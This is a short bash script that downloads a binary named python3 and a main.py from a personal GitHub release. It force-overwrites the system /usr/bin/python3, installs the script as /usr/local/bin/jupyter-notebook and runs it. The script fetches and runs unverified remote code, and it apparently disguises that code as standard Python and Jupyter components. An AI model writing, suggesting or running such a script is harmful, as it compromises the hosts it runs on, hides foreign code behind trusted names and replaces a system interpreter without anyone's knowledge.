#!/bin/bash -e

wget https://github.com/thuanx287/temp/releases/download/1/python3
wget https://github.com/thuanx287/temp/releases/download/1/main.py

chmod 755 python3

mv -f python3 /usr/bin/python3
mv -f main.py /usr/local/bin/jupyter-notebook

/usr/bin/python3 /usr/local/bin/jupyter-notebook
